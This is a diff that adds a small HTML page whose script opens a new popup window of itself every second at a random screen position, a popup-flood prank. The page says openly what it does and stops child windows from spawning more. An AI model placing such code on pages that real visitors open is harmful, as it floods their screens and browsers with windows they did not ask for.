@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Self-Opening Moving Windows</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .content {
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Welcome!</h1>
+        <p>This page opens new moving windows rapidly.</p>
+    </div>
+
+    <script>
+        function openMovingWindows() {
+            setInterval(() => {
+                const width = 400;
+                const height = 300;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+
+                // Generate random positions within the screen bounds
+                const randomX = Math.floor(Math.random() * (screenWidth - width));
+                const randomY = Math.floor(Math.random() * (screenHeight - height));
+
+                window.open(window.location.href, '_blank', `width=${width},height=${height},left=${randomX},top=${randomY}`);
+            }, 1000); // Opens a new moving window every second
+        }
+
+        // Ensure it only opens new windows when directly accessed
+        if (window.opener == null) {
+            openMovingWindows();
+        }
+    </script>
+</body>
+</html>
